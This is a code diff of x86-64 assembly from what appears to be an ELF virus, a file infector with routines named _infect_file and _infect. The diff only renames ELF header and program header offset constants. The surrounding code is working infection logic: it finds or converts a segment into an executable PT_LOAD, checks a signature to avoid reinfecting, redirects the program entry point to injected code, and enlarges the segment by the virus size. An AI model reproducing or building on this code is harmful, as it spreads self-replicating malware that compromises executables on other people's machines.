@@ -826,28 +826,28 @@ _infect_file: ; (string rdi, stat rsi)
 	cmp rax, 0x0
 	jne .unmap ; not elf 64 file
 
-	cmp byte[rsi + E_TYPE], ET_EXEC ; ET_EXEC
+	cmp byte[rsi + ehdr.e_type], ET_EXEC ; ET_EXEC
 	je .is_elf_file
-	cmp byte[rsi + E_TYPE], ET_DYN ; ET_DYN
+	cmp byte[rsi + ehdr.e_type], ET_DYN ; ET_DYN
 	jne .unmap
 
 	.is_elf_file:
 		; get pt_load exec
 		xor rcx, rcx
 		mov rbx, r13
-		add rbx, [r13 + E_PHOFF]; e_phoff
-		mov ax, [r13 + E_PHNUM]; e_phnum
+		add rbx, [r13 + ehdr.e_phoff]; e_phoff
+		mov ax, [r13 + ehdr.e_phnum]; e_phnum
 		.find_segment_exec:
 			inc rcx
 			cmp rcx, rax
 			jge .get_segment_note
 			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
 			jne .next_segment_exec
-			mov dx, [rbx + P_FLAGS]; p_flags
+			mov dx, [rbx + phdr.p_flags]; p_flags
 			and dx, PF_X ; PF_X
 			jnz .check_if_infected
 			.next_segment_exec:
-				mov ax, [r13 + E_PHNUM]; e_phnum
+				mov ax, [r13 + ehdr.e_phnum]; e_phnum
 				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
 ; = test
@@ -856,13 +856,13 @@ _infect_file: ; (string rdi, stat rsi)
 			xor rsi, rsi; max
 			xor rcx, rcx
 			mov rbx, r13
-			add rbx, [r13 + E_PHOFF]; e_phoff
+			add rbx, [r13 + ehdr.e_phoff]; e_phoff
 			.find_max:
 				inc rcx
 				cmp rcx, rax
 				jge .found_max
-				mov rdx, [rbx + P_VADDR]
-				add rdx, [rbx + P_MEMSZ]
+				mov rdx, [rbx + phdr.p_vaddr]
+				add rdx, [rbx + phdr.p_memsz]
 				cmp rsi, rdx
 				jge .continue
 				push rdx
@@ -873,7 +873,7 @@ _infect_file: ; (string rdi, stat rsi)
 			.found_max:
 			xor rcx, rcx
 			mov rbx, r13
-			add rbx, [r13 + E_PHOFF]; e_phoff
+			add rbx, [r13 + ehdr.e_phoff]; e_phoff
 		.find_segment_note:
 			inc rcx
 			cmp rcx, rax
@@ -915,9 +915,9 @@ _infect_file: ; (string rdi, stat rsi)
 			pop r13
 			add rbx, r13
 			mov dword[rbx], PT_LOAD; PT_LOAD
-			mov dword[rbx + P_FLAGS], 5; PF_X | PF_R
+			mov dword[rbx + phdr.p_flags], 5; PF_X | PF_R
 			mov rax, [r12 + ST_SIZE]
-			mov [rbx + P_OFFSET], rax
+			mov [rbx + phdr.p_offset], rax
 			xor rdx, rdx
 			push 0x1000
 			pop rcx
@@ -929,11 +929,11 @@ _infect_file: ; (string rdi, stat rsi)
 			mul rcx
 			add rax, rdx
 
-			mov [rbx + P_VADDR], rax
-			mov [rbx + P_PADDR], rax
-			mov qword[rbx + P_FILESZ], 0x0
-			mov qword[rbx + P_MEMSZ], 0x0
-			mov qword[rbx + P_ALIGN], 0x1000
+			mov [rbx + phdr.p_vaddr], rax
+			mov [rbx + phdr.p_paddr], rax
+			mov qword[rbx + phdr.p_filesz], 0x0
+			mov qword[rbx + phdr.p_memsz], 0x0
+			mov qword[rbx + phdr.p_align], 0x1000
 
 			mov rdi, [r12 + ST_SIZE]
 			add rdi, r13 ; addr pointer -> mmap
@@ -976,9 +976,9 @@ _infect_file: ; (string rdi, stat rsi)
 			lea rdx, [rel signature]
 			lea rcx, [rel fingerprint]
 			sub rcx, rdx
-			mov rdi, [rbx + P_OFFSET]; p_offset
+			mov rdi, [rbx + phdr.p_offset]; p_offset
 			add rdi, r13
-			mov rsi, [rbx + P_FILESZ]; p_filesz
+			mov rsi, [rbx + phdr.p_filesz]; p_filesz
 ;			cmp rsi, rcx
 ;			jl .unmap
 			call _ft_memmem
@@ -988,9 +988,9 @@ _infect_file: ; (string rdi, stat rsi)
 			jne .unmap
 
 			; check size needed
-			mov rdi, [rbx + P_OFFSET]
+			mov rdi, [rbx + phdr.p_offset]
 			add rdi, rsi; p_offset + p_filesz
-			mov rsi, [rbx + SIZEOF(ELF64_PHDR) + P_OFFSET] ; next->p_offset
+			mov rsi, [rbx + SIZEOF(ELF64_PHDR) + phdr.p_offset] ; next->p_offset
 			sub rsi, rdi
 
 			add rdi, r13 ; addr pointer -> mmap
@@ -1109,22 +1109,22 @@ _infect:
 	sub rdi, r13
 	; copy mapped 'padding' like 0x400000
 	mov rsi, rdi
-	add rsi, [rbx + P_VADDR]; p_vaddr
-	sub rsi, [rbx + P_OFFSET]; p_offset
+	add rsi, [rbx + phdr.p_vaddr]; p_vaddr
+	sub rsi, [rbx + phdr.p_offset]; p_offset
 	mov [rax], rsi ; entry_inject
 	add rax, 8
-	mov rsi, [r13 + E_ENTRY]; entry_prg
+	mov rsi, [r13 + ehdr.e_entry]; entry_prg
 	mov [rax], rsi
 
 	; change entry
 	; copy mapped 'padding' like 0x400000
-	add rdi, [rbx + P_VADDR]; vaddr
-	sub rdi, [rbx + P_OFFSET]; p_offset
-	mov [r13 + E_ENTRY], rdi ; new_entry
+	add rdi, [rbx + phdr.p_vaddr]; vaddr
+	sub rdi, [rbx + phdr.p_offset]; p_offset
+	mov [r13 + ehdr.e_entry], rdi ; new_entry
 
 	; change pt_load size
-	add [rbx + P_FILESZ], rdx; p_filesz + virus
-	add [rbx + P_MEMSZ], rdx; p_memsz + virus
+	add [rbx + phdr.p_filesz], rdx; p_filesz + virus
+	add [rbx + phdr.p_memsz], rdx; p_memsz + virus
 ret
 
 _check_file_process:; (string rdi)
